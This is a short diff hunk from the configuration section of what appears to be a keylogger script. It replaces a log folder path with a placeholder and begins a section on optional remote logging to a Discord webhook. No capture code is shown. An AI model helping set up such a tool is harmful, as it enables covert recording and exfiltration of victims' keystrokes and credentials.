@@ -340,7 +340,7 @@ def main() -> None:
     # 1. WHERE TO SAVE LOGS
     # Replace 'Path.home() / "logs"' with your custom path if needed.
     # Example: Path(r"E:\KeyLogger\Logs")
-    LOG_PATH = Path(r"E:\KeyLogger\Logs") 
+    LOG_PATH = Path(r"Your_Path") 
 
     # 2. REMOTE LOGGING (OPTIONAL)
     # Paste your Discord Webhook URL inside the quotes below.
